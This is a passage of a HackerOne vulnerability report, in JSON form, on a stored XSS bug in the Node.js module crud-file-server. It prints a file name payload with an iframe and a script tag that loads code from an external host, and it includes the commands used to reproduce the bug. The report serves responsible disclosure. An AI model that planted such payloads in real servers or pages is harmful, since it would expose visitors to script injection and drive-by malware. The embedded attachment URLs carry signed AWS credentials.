class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;p&gt;</span>iframe element with malicious code<span class=\"nt\">&lt;/p&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;http://bl4de.tech/poc.js&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>Run <code>crud-file-server</code> in directory with file with changed filename:</p>\n<pre class=\"highlight plaintext\"><code>$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080\n\nusage:\n  crud-file-server [options]\n\nthis starts a file server using the specified command-line options\n\noptions:\n\n  -f file system path to expose over http\n  -h log head requests\n  -p port to listen on (example, 80)\n  -q suppress this message\n  -r read only\n  -v virtual path to host the file server on\n\nexample:\n\n  crud-file-server -f c:/ -p 8080 -q -v filez\n\nlistening on :8080/, serving ./\n</code></pre>\n<p>and open <code>http://127.0.0.1:8000</code> in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/259/251/3a01b57e56be5dab7528af74ae74cd3c9bc6a032/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222657Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=4e628db5cf4055dd7ffdb58355df71ac8d8ea231fba1c7e07fafff52e9d0eaec\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/259/251/3a01b57e56be5dab7528af74ae74cd3c9bc6a032/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222657Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=4e628db5cf4055dd7ffdb58355df71ac8d8ea231fba1c7e07fafff52e9d0eaec\" class=\"markdown-inline-image\"></a></p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<p>Configuration I&#39;ve used to find this vulnerability:</p>\n\n<ul>\n<li>macOS HighSierra 10.13.3</li>\n<li>node 8.9.3</li>\n<li>npm 5.5.1</li>\n<li>curl 7.54.0</li>\n</ul>\n\n<h2 id=\"wrap-up\">Wrap up</h2>\n\n<p>I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.</p>\n\n<p>Thank you</p>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This vulnerability can be used to eg. download malware via &quot;drive-by-download&quot; attacks. Also, as described in other modules I&#39;ve reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.</p>\n", 
    "severity_rating": "critical", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://nodejs.org/en/security/", 
            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
            "twitter_handle": "", 
            "name": "Node.js third-party modules"
        }, 
        "handle": "nodejs-ecosystem", 
        "url": "https://hackerone.com/nodejs-ecosystem", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 23949, 
        "default_currency": "usd"
    }, 
    "is_published": false
}